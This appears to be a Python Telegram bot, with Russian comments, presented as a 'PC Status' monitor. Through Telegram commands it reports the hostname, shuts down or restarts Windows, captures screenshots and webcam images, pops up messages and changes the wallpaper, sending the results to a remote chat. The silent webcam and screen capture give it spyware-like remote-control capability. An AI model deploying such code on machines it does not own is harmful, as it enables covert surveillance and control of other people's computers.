import os
import ctypes
import time
import requests
import cv2
import pyautogui
import platform
import telebot
from telebot import types
import config
import datetime
import colorama
import pyfiglet
import os
from colorama import Fore, Back, Style
import socket
import subprocess

hostname = socket.gethostname()
colorama.init()

# Получаем текущую дату и время
now = datetime.datetime.now()
os.system('cls' if os.name == 'nt' else 'clear')
print(Fore.MAGENTA + pyfiglet.figlet_format('PC Status'))
print()
print(Fore.LIGHTBLACK_EX + '[!] ' + Fore.GREEN + 'Данные были отправлены к ' + Fore.YELLOW + 't.me/pcstatus_sefdirelaxbot')
print(Fore.LIGHTBLACK_EX + '[!] ' + Fore.GREEN + 'Можно закрывать консоль')

bot = telebot.TeleBot(config.TOKEN)

message_text = (
    "┌ 🖥 × Статус компьютера: `Включён`\n"
	#"│ \n"
	f"└ ☄ × Название ПК: `{hostname}` \n"
	" \n"
	"📃 × Тип отправки: `Shell Start Up`"
    " \n"
    f"⏰ × Время включения: `{now.strftime('%H:%M')}`\n"
	" \n"
	f"📅 × Дата включения: `{now.strftime('%Y-%m-%d')}`"
	" \n"
)

keyboard = telebot.types.InlineKeyboardMarkup()
button = telebot.types.InlineKeyboardButton(text="Выключить компьютер", callback_data="shutdown_computer")
button2 = telebot.types.InlineKeyboardButton(text="Перезагрузить компьютер", callback_data="restart_computer")
status_bt = telebot.types.InlineKeyboardButton(text="Узнать статус", callback_data="status_for_pc")
keyboard.add(button)
keyboard.add(button2)
keyboard.add(status_bt)
#keyboard.add(button, button2, status_bt)

# Обработчик нажатия на кнопку
# Обработчик нажатия на кнопку
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "shutdown_computer":
        subprocess.run("shutdown /s /t 1", shell=True)
        bot.send_message(call.message.chat.id, "┌ 🖥 × Статус компьютера: `Выключение`\n"
											   f"└ ☄ × Название ПК: `{hostname}` \n"
											   " \n"
											   "📃 × Тип отправки: `Console | Button`"
											   " \n"
											   f"⏰ × Время выключения: `{now.strftime('%H:%M')}`\n"
											   " \n"
											   f"📅 × Дата выключения: `{now.strftime('%Y-%m-%d')}`"
											   " \n", parse_mode="Markdown")
    elif call.data == "restart_computer":
        subprocess.run("shutdown /r /t 1", shell=True)
        bot.send_message(call.message.chat.id, f"┌ 🖥 × Статус компьютера: `Перезагрузка`\n"
											   f"└ ☄ × Название ПК: `{hostname}` \n"
											   f" \n"
											   f"📃 × Тип отправки: `Console | Button`\n"
											   f"⏰ × Время перезагрузки: `{now.strftime('%H:%M')}`\n"
											   f"📅 × Дата перезагрузки: `{now.strftime('%Y-%m-%d')}`\n", parse_mode="Markdown")
    elif call.data == "status_for_pc":
        bot.send_message(call.message.chat.id, f"┌ 🖥 × Статус компьютера: `Включён`\n"
                                               f"└ ☄ × Название ПК: `{hostname}` \n"
                                               f" \n"
                                               f"📃 × Тип отправки: `Узнать статус`\n"
                                               f"⏰ × Время статуса: `{now.strftime('%H:%M')}`\n"
                                               f"📅 × Дата статуса: `{now.strftime('%Y-%m-%d')}`\n", parse_mode="Markdown")



bot.send_message(config.CHAT_ID, text=message_text, reply_markup=keyboard, parse_mode="Markdown")





#
#	rmk.row(*btns[0])
#	rmk.row(*btns[1])
#	bot.send_message(message.chat.id,
#		"""Выберите действие:
#		/ip - Получить IP адрес
#		/spec - Получить информацию о системе
#		/webcam - Получить снимок экрана
#		/message - Отправить сообщение
#		/input - Отправить сообщение с возможностью ответа
#		/wallpaper - Сменить обои
#		/sct - Получить снимок экрана
#		""",
# )




@bot.message_handler(commands=["status", "status_pc"])
def status_pc(message):
	bot.send_message(message.chat.id, "кукукуку")


@bot.message_handler(commands=["spec", "specifications"])
def specifications(message):
	banner = f"""
	Название: {platform.node()}
	Процессор: {platform.processor()}
	Система: {platform.system()} {platform.release()}
	"""
	bot.send_message(message.chat.id, banner)


@bot.message_handler(commands=["sct", "screenshot"])
def screenshot(message):
	filename = f"{time.time()}.jpg"
	pyautogui.screenshot(filename)

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["webcam"])
def webcam(message):
	filename = "cam.jpg"
	cap = cv2.VideoCapture(0)

	for i in range(30):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite(filename, frame)
	cap.release()

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["message"])
def send_message_to_client(message):
	msg = bot.send_message(message.chat.id, "Введите сообщение:")
	bot.register_next_step_handler(msg, sms_to_client)


def sms_to_client(message):
	try:
		pyautogui.alert(message.text, "Message")
	except Exception:
		bot.send_message(message.chat.id, "Что-то пошло не так...")





@bot.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = bot.send_message(message.chat.id, "Отправьте картинку:")
	bot.register_next_step_handler(msg, set_wallpaper)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	file = message.photo[-1].file_id
	file = bot.get_file(file)

	download_file = bot.download_file(file.file_path)
	with open("image.jpg", "wb") as img:
		img.write(download_file)

	path = os.path.abspath("image.jpg")
	ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


if __name__ == '__main__':
	bot.polling()